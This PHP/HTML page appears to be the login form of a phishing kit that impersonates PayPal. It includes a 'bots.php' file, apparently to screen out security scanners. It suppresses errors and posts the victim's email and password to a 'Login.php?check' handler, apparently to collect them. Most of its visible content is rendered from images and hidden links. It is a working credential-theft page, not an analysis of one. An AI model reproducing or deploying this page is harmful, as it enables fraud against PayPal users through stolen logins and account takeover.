<?php include "encriptar.php";?>
<?php
require_once 'hostname.php';
error_reporting(0);
session_start();
set_time_limit(0);
include"bots.php";

$post="Login.php?check;".md5(time());

?>
<!DOCTYPE HTML5>
<html>
<head>
<meta charset="UTF-8">
<title>Login - PayPal</title>
<link rel="icon" href="img/icon.png" />
<link rel="stylesheet" href="css/gfrehegr.css">
</head>
<body>
<div id="bar">
   <div id="wrapperbar">
   <img src="img/website_logo.gif" style="padding-top: 10px;">
   </div>
</div>
<div id="wrapper">
<img src="img/texto.png" style="float: right;padding-top: 20px;padding-right: 70px;">
<div id="block">
<img src="img/login.png">
<div id="loginform">
<form id="form" name="form" method="POST" action="<?php echo $post; ?>">
<img src="img/email.png" for="eml">
<input type="text" name="eml" type="email"  value="<?php if (isset($_SESSION['EMAIL'])) { print $_SESSION['EMAIL'];} else {echo'';} ?>">
<img src="img/pw.png" for="passwd">
<input type="password"  name="passwd">
<div style="position:relative; height:166px; width:342px; background:url(img/c95c9a42995ebe0fe080f74a29a1c5af6.png) 0 0 no-repeat;"><a value="" onclick="document.forms['form'].submit(); return false;" style="position:absolute; top:15px; left:1px; width:333px; height:34px;" title="" alt="" target="_self"></a><a style="position:absolute; top:69px; left:1px; width:278px; height:14px;" title="" alt="" href="#" target="_self"></a><a style="position:absolute; top:118px; left:1px; width:338px; height:40px;" title="" alt="" href="#" target="_self"></a><a style="position:absolute; overflow:hidden; top:164px; left:340px; width:1px; height:1px;" title="" alt="" href="#" target="_self"></a></div>
</div>
</div>
<div id="footer">
<img src="img/copyright.png">
</div>
</div>
</body>
</html>